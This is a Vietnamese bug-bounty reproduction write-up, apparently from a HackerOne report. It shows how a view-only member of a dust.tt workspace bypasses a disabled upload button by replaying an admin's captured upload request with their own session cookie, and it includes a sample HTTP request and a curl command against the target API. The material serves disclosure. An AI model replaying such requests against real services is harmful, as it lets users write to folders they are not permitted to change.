# https://hackerone.com/reports/3101986
---

## 1. Thiết lập

* **Account A (Admin)** có quyền full với folder `restricted-folder-123`.
* **Account B (Member)** chỉ được quyền **view**, không có quyền upload vào folder này.
* Hai tài khoản đã thuộc cùng workspace `workspace123`.

---

## 2. Bước 1 – Xác nhận UI block

1. Login bằng **Account B** → vào folder `restricted-folder-123`.
2. Quan sát nút **“Add multiple documents”** hiển thị mờ (disabled) trên UI.
3. Thử click trực tiếp bằng UI → không upload được (button thực sự disable).

---

## 3. Bước 2 – Bắt request upload chuẩn

1. Login bằng **Account A**, upload một file bất kỳ vào folder để có mẫu request:

   ```http
   POST /api/w/workspace123/knowledge/spaces/…/folders/restricted-folder-123/documents
   Cookie: appSession=<SESSION_ADMIN>
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary…

   ------WebKitFormBoundary…
   Content-Disposition: form-data; name="file"; filename="test.pdf"
   Content-Type: application/pdf

   [binary data]
   ------WebKitFormBoundary…--
   ```
2. Lưu lại endpoint và header mẫu.

---

## 4. Bước 3 – Thực thi bypass bằng Account B

1. Logout Admin, login lại bằng **Account B**.
2. Khởi động **Burp Suite** (hoặc DevTools → Network → “Copy as fetch/cURL”).
3. Tái tạo request upload (bước 2) nhưng dùng cookie `appSession=<SESSION_MEMBER>` của Account B.

   ```bash
   curl "https://dust.tt/api/w/workspace123/knowledge/spaces/.../folders/restricted-folder-123/documents" \
     -X POST \
     -H "Cookie: appSession=<SESSION_MEMBER>" \
     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary..." \
     --data-binary @test.pdf
   ```
4. Gửi request lên server.

---

## 5. Kết quả

* **200 OK** kèm thông tin document mới được tạo.
* Mở UI reload folder (vẫn dưới Account B) → thấy file `test.pdf` xuất hiện trong folder `restricted-folder-123` mà lẽ ra B không có quyền upload.

---

## 6. Impact

* **IDOR**: Member có thể chèn file vào folder của Admin, phá vỡ tính toàn vẹn dữ liệu.
* Có thể upload file độc hại, script, credential, hoặc “spam” folder để tấn công social-engineer.

---

